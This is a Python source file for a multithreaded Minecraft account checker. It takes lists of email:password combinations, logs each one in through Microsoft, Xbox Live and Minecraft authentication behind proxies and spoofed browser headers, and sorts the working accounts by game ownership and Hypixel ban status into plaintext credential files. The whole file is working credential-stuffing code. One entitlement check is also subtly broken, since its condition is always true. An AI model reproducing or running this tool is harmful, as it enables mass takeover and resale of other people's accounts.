import requests
import warnings
import time
from workers.ui import *
from workers.utils import *
from utils.session import TLSSession
import re,asyncio
import concurrent.futures,json
from modules.checkBan import CheckBan

from minecraft.networking.connection import Connection
from minecraft.authentication import AuthenticationToken, Profile
from minecraft.networking.connection import Connection
from minecraft.networking.packets import clientbound
from minecraft.exceptions import LoginDisconnect
warnings.filterwarnings("ignore", category=DeprecationWarning)


class Minecraft:
    def __init__(self, account):

        self.session = TLSSession()
        self.email, self.password = account.split(':')

        proxy = config.get("proxy")
        if proxy:
            self.session.session.proxies = get_formatted_proxy(proxy)

        
    async def checkign(self, access_token):
        headers = {
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Authorization": f"Bearer {access_token}", 
            "Cache-Control": "max-age=0",
            "Connection": "keep-alive",
            "Host": "api.minecraftservices.com",
            "Origin": "https://www.minecraft.net",
            "Referer": "https://www.minecraft.net/",
            "sec-ch-ua": "\"Google Chrome\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\"",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "cross-site",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
        }

        res = self.session._exec_request(
            method = "GET",
            url = "https://api.minecraftservices.com/minecraft/profile",
            headers = headers
        )

        if res.status_code != 200:
            Logger.Log("MINECRAFT", "Successfully got profile", Colors.yellow, error = "This account does not have a ign", email = self.email, status = res.status_code)
            return False
        
        
        self.name = res.json()["name"]
        capes = res.json()["capes"]
        skins = res.json()["skins"]
        self.id_user = res.json()["id"]
        Logger.Log("MINECRAFT", "Successfully got profile", Colors.green, email = self.email, name = self.name, capes = len(capes), skins = len(skins), id = self.id_user)



        return self.name

    async def login(self):

        url = "https://login.live.com/oauth20_authorize.srf?client_id=000000004C12AE6F&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"

        res = self.session._exec_request(
            method = "GET",
            url = url
        )

        resp = res.content.decode()

        try:

            sFFTag = resp.split('sFTTag:\'<input type="hidden" name="PPFT" id="i0327" value="')[1].split('"/>')[0]
        except:
            Logger.Log("LOGIN", "Failed to get sFFTag", Colors.red, error = "Invalid Credentials", email = self.email)

            return False
        

        try:

            urlPost = resp.split("urlPost:'")[1].split("',")[0]

        except:
            Logger.Log("LOGIN", "Failed to get urlPost", Colors.red, error = "Invalid Credentials", email = self.email)

            return False
        
        payload = {
            "login": self.email,
            "loginfmt": self.email,
            "passwd": self.password,
            "PPFT": sFFTag
        }
        
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Host": "login.live.com",
            "Referer": "https://www.minecraft.net/",
            "sec-ch-ua": "\"Google Chrome\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\"",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "cross-site",
            "Sec-Fetch-User": "?1",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
        }

        res = self.session._exec_request(
            method = "POST",
            url = urlPost,
            data = payload,
            headers = headers,
            allow_redirects = True
        )

        try:
            
            raw_login_data = res.url.split("#")[1]
            
        except IndexError:

            Logger.Log("LOGIN", "Failed to login", Colors.red, error = "Invalid Credentials", email = self.email)
            return False
        

        
        login_data = dict(item.split("=") for item in raw_login_data.split("&"))

        login_data["access_token"] = requests.utils.unquote(login_data["access_token"])

        access_token = login_data["access_token"]

        self.session.session.cookies.clear()

        headers = {
            "Content-Type": "application/json",
            "Accept": "application/json"
        }

        data = {
            "Properties": {
                "AuthMethod": "RPS",
                "SiteName": "user.auth.xboxlive.com",
                "RpsTicket": access_token
            },
            "RelyingParty": "http://auth.xboxlive.com",
            "TokenType": "JWT"
        }

        res = self.session._exec_request(

            method = "POST",
            url = "https://user.auth.xboxlive.com/user/authenticate",
            headers = headers,
            json = data
        )
        
        res = res.json()

        xbox_token = res["Token"]
        uhs = res["DisplayClaims"]["xui"][0]["uhs"]

        headers = {
            "Content-Type": "application/json",
            "Accept": "application/json"
        }

        data = {
            "Properties": {
                "SandboxId": "RETAIL",
                "UserTokens": [
                    xbox_token
                ]
            },
            "RelyingParty": "rp://api.minecraftservices.com/",
            "TokenType": "JWT"
        }

        res = self.session._exec_request(
            method = "POST",
            url = "https://xsts.auth.xboxlive.com/xsts/authorize",
            headers = headers,
            json = data
        )
        
        try:
            
            access_token = res.json()["Token"]

        except:
            Logger.Log("TOKEN", "Failed to login", Colors.red, error = "Xbox Not Found", email = self.email)
            return False





        headers = {
            "Content-Type": "application/json"
        }

        data = {
            "identityToken": "XBL3.0 x=%s;%s" % (uhs, access_token),
            "ensureLegacyEnabled": True
        }

        res = self.session._exec_request(
            method = "POST",
            url = "https://api.minecraftservices.com/authentication/login_with_xbox",
            headers = headers,
            json = data
        )

        try:

            access_token = res.json()["access_token"]

            if access_token:

                Logger.Log("TOKEN", "Successfully logged in", Colors.cyan, email = self.email)
                with open("output/valid.txt", "a") as f:
                    f.write(f"{self.email}:{self.password}\n")

                return access_token
            
            else:

                Logger.Log("TOKEN", "Failed to login", Colors.red, error = "Access Token", email = self.email)

                return False
            
        except:
            
            Logger.Log("TOKEN", "Failed to login", Colors.red, error = "Access Token", email = self.email)

            return False
        
    async def minecraft(self, access_token):
                
            
        headers = {
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Authorization": f"Bearer {access_token}", 
            "Cache-Control": "max-age=0",
            "Connection": "keep-alive",
            "Host": "api.minecraftservices.com",
            "Origin": "https://www.minecraft.net",
            "Referer": "https://www.minecraft.net/",
            "sec-ch-ua": "\"Google Chrome\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\"",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "cross-site",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
        }



        url = "https://api.minecraftservices.com/entitlements/mcstore"
        res = self.session._exec_request(
            method = "GET",
            url = url,
            headers = headers
        )


        if res.status_code != 200:
            Logger.Log("MINECRAFT", "Failed to get profile", Colors.red, error = "This account does not own Minecraft", email = self.email, status = res.status_code)
            return False

        if 'product_game_pass_ultimate' in res.text:
            Logger.Log("MINECRAFT", "Grabbed Store Data", Colors.cyan, email = self.email, store = "Game Pass Ultimate")
            
            return 'gamepass_ultimate'

        elif 'product_game_pass_pc' in res.text:
            Logger.Log("MINECRAFT", "Grabbed Store Data", Colors.cyan, email = self.email, store = "Game Pass PC")

            return 'gamepass_pc'
        
        elif '"product_minecraft"' in res.text:
            Logger.Log("MINECRAFT", "Grabbed Store Data", Colors.cyan, email = self.email, store = "Java Edition")
            
            return 'minecraft'


        elif 'product_minecraft_bedrock' in res.text:
            Logger.Log("MINECRAFT", "Grabbed Store Data", Colors.cyan, email = self.email, store = "Bedrock Edition")

            return 'minecraft_bedrock'

        elif 'product_legends' or 'product_dungeons' in res.text:
            
            return 'dungeons'

        else:
            
            return 'other'
        
        

async def main(account):

    if account.count(":") != 1:
        Logger.Log("ACCOUNT", "Invalid account", Colors.red, error = "Invalid format", account = account)
        return False
    
    mc = Minecraft(account)

    login = await mc.login()

    if login:

        minecraft = await mc.minecraft(login)
        lis = ['gamepass_ultimate', 'gamepass_pc', 'minecraft']
        if minecraft in lis:

            ign = await mc.checkign(login)

            if mc.id_user:
                banStatus = CheckBan(login, mc.name, mc.id_user).check_ban()

                if banStatus == "False":
                    Logger.Log("MINECRAFT", "Account is not banned on hypixel", Colors.green, email = mc.email)
                    with open(f"output/unbanned.txt", "a") as f:
                        f.write(f"{mc.email}:{mc.password} | name={mc.name}\n")

                else:
                    Logger.Log("MINECRAFT", "Account is banned on hypixel", Colors.red, email = mc.email, ban = banStatus)
                    with open(f"output/banned.txt", "a") as f:
                        f.write(f"{mc.email}:{mc.password} | name={mc.name}\n")

            if ign:

                with open(f"output/{minecraft}.txt", "a") as f:
                    f.write(f"{mc.email}:{mc.password} | name={ign} | Banned={banStatus}\n")



        elif minecraft == 'minecraft_bedrock':

            with open("output/minecraft_bedrock.txt", "a") as f:
                f.write(f"{mc.email}:{mc.password}\n")

        elif minecraft == 'dungeons':

            with open("output/dungeons.txt", "a") as f:
                f.write(f"{mc.email}:{mc.password}\n")

        else:
            with open("output/other.txt", "a") as f:
                f.write(f"{mc.email}:{mc.password}\n")


if __name__ == "__main__":
    with open("accounts.txt", "r") as f:
        accounts = f.read().splitlines()

    with open("config.json", "r") as f:
        config = json.load(f)

    loop = asyncio.get_event_loop()

    with concurrent.futures.ThreadPoolExecutor(max_workers=int(config["workers"])) as executor:
        
        tasks = [loop.run_in_executor(executor, asyncio.run, main(account)) for account in accounts]
        
        loop.run_until_complete(asyncio.gather(*tasks))

        loop.close()